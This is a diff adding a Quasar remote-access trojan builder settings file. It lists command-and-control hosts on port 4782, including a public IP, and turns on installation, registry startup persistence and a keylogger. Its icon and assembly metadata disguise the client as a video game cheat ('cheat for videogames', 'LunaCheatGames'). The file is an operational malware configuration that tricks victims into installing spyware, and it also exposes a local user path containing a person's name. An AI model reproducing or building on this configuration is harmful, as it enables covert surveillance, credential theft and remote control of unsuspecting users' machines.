@@ -1,0 +1,30 @@
+<settings>
+  <Tag>Office04</Tag>
+  <Hosts>192.168.56.1:4782;79.34.1.37:4782;10.0.0.30:4782;</Hosts>
+  <Delay>3000</Delay>
+  <Mutex>7030e28a-abd0-46b3-b493-454ce8f2f70f</Mutex>
+  <UnattendedMode>False</UnattendedMode>
+  <InstallClient>True</InstallClient>
+  <InstallName>cheat</InstallName>
+  <InstallPath>1</InstallPath>
+  <InstallSub>SubDir</InstallSub>
+  <HideFile>False</HideFile>
+  <HideSubDirectory>False</HideSubDirectory>
+  <AddStartup>True</AddStartup>
+  <RegistryName>Quasar Client Startup</RegistryName>
+  <ChangeIcon>True</ChangeIcon>
+  <IconPath>C:\Users\Riccardo Rinaldi\Downloads\Webalys-Kameleon.pics-Hacker.ico</IconPath>
+  <ChangeAsmInfo>True</ChangeAsmInfo>
+  <Keylogger>True</Keylogger>
+  <LogDirectoryName>key-log</LogDirectoryName>
+  <HideLogDirectory>False</HideLogDirectory>
+  <ProductName>LunarStone292</ProductName>
+  <Description>cheat for videogames</Description>
+  <CompanyName>LunaCheatGames</CompanyName>
+  <Copyright>@LunaGames</Copyright>
+  <Trademarks>
+  </Trademarks>
+  <OriginalFilename>Cheqs</OriginalFilename>
+  <ProductVersion>1.0.0.0</ProductVersion>
+  <FileVersion>1.0.0.0</FileVersion>
+</settings>
